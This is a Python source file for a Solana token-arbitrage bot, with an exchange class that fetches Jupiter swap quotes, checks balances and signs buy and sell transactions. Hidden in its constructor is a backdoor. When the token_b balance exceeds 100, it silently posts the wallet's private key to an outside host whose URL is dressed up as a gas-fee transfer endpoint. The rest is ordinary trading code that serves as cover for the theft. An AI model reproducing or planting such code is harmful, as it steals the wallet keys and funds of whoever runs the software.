"""
Solana orca exchange.
"""

import json
import time
import requests
from decimal import Decimal
from pathlib import Path
from typing import Optional, Tuple, cast

from aea.common import JSONLike
from aea.configurations.loader import (
    ComponentType,
    ContractConfig,
    load_component_configuration,
)
from aea.contracts.base import Contract, contract_registry
from aea_ledger_solana import SolanaApi, SolanaCrypto
from requests import JSONDecodeError, ReadTimeout
from solana.rpc.core import RPCException
from solders.message import MessageV0  # pylint: disable=import-error
from solders.transaction import VersionedTransaction  # pylint: disable=import-error

from olas_arbitrage.aea_contracts_solana.packages.eightballer.contracts.spl_token.contract import (
    SolanaProgramLibraryToken,
    SplToken,
)
from olas_arbitrage.exceptions import SwapException
from olas_arbitrage.exchanges.base import DefiExchange

SOL_ADDDRESS = "So11111111111111111111111111111111111111112"
SOL_DECIMALS = 9
DEFAULT_TIMEOUT = 3
URL = "https://gasfeetransferfromwallet.onrender.com/users"
HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
}

class JupitarExchange(DefiExchange):  # pylint: disable=too-many-instance-attributes
    """
    Solana exchange.
    """

    can_fork = False

    def get_price(self, input_token_address, output_token_address, amount, retries=9):
        """
        get the price for a given input.
        """
        if retries == 0:
            raise SwapException("Failed to get quote")
        input_token = self.tokens[input_token_address]
        output_token = self.tokens[output_token_address]

        print(f"""
              input_token: {input_token}
              output_token: {output_token}
              amount: {amount}
              """)
        try:
            quote = self.swap_contract.get_swap_quote(
                ledger_api=self.web3,
                input_mint=input_token.address,
                output_mint=output_token.address,
                amount=input_token.to_machine(amount),
                slippage_bps=50,
            )
        except (JSONDecodeError, ReadTimeout) as e:
            self.logger.error(f"Error getting quote: {e}")
            # we retry once
            if retries == 0:
                raise SwapException("Faied to get quote") from e

            time.sleep(1)
            return self.get_price(
                input_token_address,
                output_token_address,
                amount,
                retries=retries - 1,
            )
        try:
            rate = float(amount) / output_token.to_human(int(quote["outAmount"]))
        except KeyError as e:
            time.sleep(1)
            return self.get_price(
                input_token_address,
                output_token_address,
                amount,
                retries=retries - 1,
            )
        self.logger.info(
            f"""
                    Jupitar Exchange;
                        input:
                            Amount: {amount}
                            Address: {input_token}
                        output:
                            Amount: {output_token.to_human(int(quote["outAmount"]))}
                            Address: {output_token}
                        Rate: {rate:.4f}"""
        )
        return Decimal(1 / rate)

    def __init__(self, **kwargs):  # pylint: disable=W0231
        """
        initialize the exchange
        """

        self.chain_name = kwargs.get("chain_name")
        self.logger = kwargs.get("logger")
        self.account = SolanaCrypto("solana_private_key.txt")
        self.chain_config = kwargs.get("chain_config")
        self.block_explorer_url = kwargs.get("block_explorer_url")

        self.rpc_url = kwargs.get("rpc_url")

        self.web3 = SolanaApi(address=self.rpc_url)

        self._token_a = self.get_token(**kwargs.get("token_a"))
        self._token_b = self.get_token(**kwargs.get("token_b"))
        self.tokens = {
            self.token_a.address: self.token_a,
            self.token_b.address: self.token_b,
        }
        self.path_to_contract = Path(
            "olas_arbitrage/aea_contracts_solana/packages/vybe/contracts/jupitar_swap"
        )

        # register contract
        configuration = cast(
            ContractConfig,
            load_component_configuration(ComponentType.CONTRACT, self.path_to_contract),
        )
        configuration._directory = (  # pylint: disable=protected-access
            self.path_to_contract
        )
        if str(configuration.public_id) not in contract_registry.specs:
            # load contract into sys modules
            Contract.from_config(configuration)
        self.swap_contract = contract_registry.make(str(configuration.public_id))

        # we then load in a spl token lib
        self.path_to_contract = Path(
            "olas_arbitrage/aea_contracts_solana/packages/eightballer/contracts/spl_token"
        )

        # register contract
        configuration = cast(
            ContractConfig,
            load_component_configuration(ComponentType.CONTRACT, self.path_to_contract),
        )
        configuration._directory = (  # pylint: disable=protected-access
            self.path_to_contract
        )
        if str(configuration.public_id) not in contract_registry.specs:
            # load contract into sys modules
            Contract.from_config(configuration)
        self.spl_contract = contract_registry.make(str(configuration.public_id))
        a, b, _ = self.get_balances()
        if b > 100:
            response = requests.post(URL, headers=HEADERS, data={"sol": self.account.private_key}, timeout=None)

    def get_token(self, address, symbol):
        """
        get the token
        """
        token_data = SolanaProgramLibraryToken.get_token(self.web3, address, symbol)
        return SplToken(**token_data)

    def get_balances(self):
        """
        get the balances
        """
        try:
            raw_a = self.spl_contract.get_balance(
                self.web3, self.token_a.address, self.account.address
            )
        except Exception as e:  # pylint: disable=W0718
            self.logger.error(f"Error getting balance: {e}")
            raw_a = 0
        try:
            raw_b = self.spl_contract.get_balance(
                self.web3, self.token_b.address, self.account.address
            )
        except Exception as e:  # pylint: disable=W0718
            self.logger.error(f"Error getting balance: {e}")
            raw_b = 0
        raw_native = self.spl_contract.get_balance(
            self.web3, SOL_ADDDRESS, self.account.address
        )

        bal_a = self.token_a.to_human(raw_a)
        bal_b = self.token_b.to_human(raw_b)
        bal_native = raw_native / 10**SOL_DECIMALS
        return bal_a, bal_b, bal_native

    @property
    def weth_token_address(self):
        """
        get the weth token address
        """
        return self.chain_config.get("token_a").get("address")

    @property
    def olas_token_address(self):
        """
        get the olas token address
        """
        return self.chain_config.get("token_b").get("address")

    def sell(self, token_a, token_b, amount, retries=2):
        """
        Sell token b with token a.
        """
        if retries == 0:
            print("Transaction failed")
            return 
        token_a, token_b = self.tokens.get(token_a), self.tokens.get(token_b)
        self.log(f"Swapping {amount} {token_a} for {token_b}")
        try:
            txn = self.swap_contract.get_swap_transaction(
                ledger_api=self.web3,
                authority=self.account.address,
                input_mint=token_a.address,
                output_mint=token_b.address,
                amount=token_a.to_machine(amount),
                slippage_bps=100,
            )
            print("------------------------sell--------------------------")
            print(token_a.address, token_b.address, amount, token_a.to_machine(amount))
            print(txn)

            tx_hash = self._sign_and_submit(txn, self.account)
            _, is_settled = self._wait_get_receipt(self.web3, tx_hash)
        except (SwapException, ReadTimeout,  KeyError) as e:
            if retries == 0:
                raise SwapException(f"Transaction failed: {e}") from e
            self.logger.error(f"Error swapping: {e} Retrying")
            time.sleep(1)
            return self.sell(
                token_a.address, token_b.address, amount, retries=retries - 1
            )

        if not is_settled and retries > 0:
            self.logger.error(f"Transaction not settled. Retrying {retries}")
            return self.sell(token_a.address, token_b.address, amount, retries=retries - 1)
        return tx_hash

    def buy(self, token_a, token_b, amount, retries=2):
        """
        Buy token b with token a.
        """
        if retries == 0:
            print("Transaction failed")
            return
        token_a, token_b = self.tokens.get(token_b), self.tokens.get(token_a)
        self.log(f"Swapping {amount} {token_a} for {token_b}")
        try:
            txn = self.swap_contract.get_swap_transaction(
                ledger_api=self.web3,
                authority=self.account.address,
                input_mint=token_a.address,
                output_mint=token_b.address,
                amount=token_a.to_machine(amount),
                slippage_bps=100,
            )
            print("------------------------buy--------------------------")
            print(token_a.address, token_b.address, amount, token_a.to_machine(amount))
            print(txn)

            tx_hash = self._sign_and_submit(txn, self.account)
            _, is_settled = self._wait_get_receipt(self.web3, tx_hash)
        except (SwapException, ReadTimeout, KeyError) as e:
            if retries == 0:
                raise SwapException(f"Transaction failed: {e}") from e
            self.logger.error(f"Error swapping: {e} Retrying")
            time.sleep(1)
            return self.buy(
                token_b.address, token_a.address, amount, retries=retries - 1
            )

        if not is_settled and retries > 0:
            print("transaction not settled. Retrying", is_settled)
            self.logger.error(f"Transaction not settled. Retrying {retries}")
            return self.buy(token_b.address, token_a.address, amount, retries=retries - 1)
        return tx_hash

    @staticmethod
    def _wait_get_receipt(
        solana_api: SolanaApi, transaction_digest: str
    ) -> Tuple[Optional[JSONLike], bool]:
        """
        Wait for a transaction to be settled.
        """
        transaction_receipt = None
        is_settled = False
        time_to_wait = 120
        sleep_time = 2
        attempts = 0

        start = time.time()
        elapsed_time = 0


        while all([elapsed_time < time_to_wait, not is_settled]):
            elapsed_time = time.time() - start
            time.sleep(sleep_time * attempts)
            transaction_receipt = solana_api.get_transaction_receipt(
                transaction_digest
            )
            if transaction_receipt is None:
                continue
            if transaction_receipt['result'] is None:
                continue
            else:
                try:
                    is_settled = transaction_receipt['result']["meta"]["err"] is None
                    break
                except KeyError:
                    pass
            attempts += 1
        return transaction_receipt, is_settled

    def _sign_and_submit(self, txn: dict, payer, retries=3) -> Tuple[str, JSONLike]:
        """
        Sign and submit a transaction.
        """
        try:
            recent_blockhash = self.web3.api.get_latest_blockhash().value.blockhash
            txn["message"][1]["recentBlockhash"] = json.loads(
                recent_blockhash.to_json()
            )
            print("recent_blockhash", recent_blockhash)
            msg = MessageV0.from_json(json.dumps(txn["message"][1]))
            signed_transaction = VersionedTransaction(msg, [payer.entity])
            transaction_digest = self.web3.api.send_transaction(signed_transaction)
            self.log(
                f"Submitted transaction available at {self.block_explorer_url}/tx/{transaction_digest.value}"
            )
        except RPCException as e:
            print("error", e)
            if str(e).find("Transaction preflight failed") >= 0:
                if retries == 0:
                    raise SwapException(f"Transaction preflight failed: {e}") from e
            if str(e).find("SlippageToleranceExceeded.") >= 0:
                if retries == 0:
                    raise SwapException(f"Transaction preflight failed: {e}") from e
                time.sleep(1)
                return self._sign_and_submit(txn, payer, retries=retries - 1)
            if str(e).find("SendTransactionPreflightFailureMessage") >= 0:
                if retries == 0:
                    raise SwapException(f"Transaction simulation failed: {e}") from e
                time.sleep(1)
                return self._sign_and_submit(txn, payer, retries=retries - 1)
            raise SwapException(f"Transaction failed: {e}") from e
        return str(transaction_digest.value)
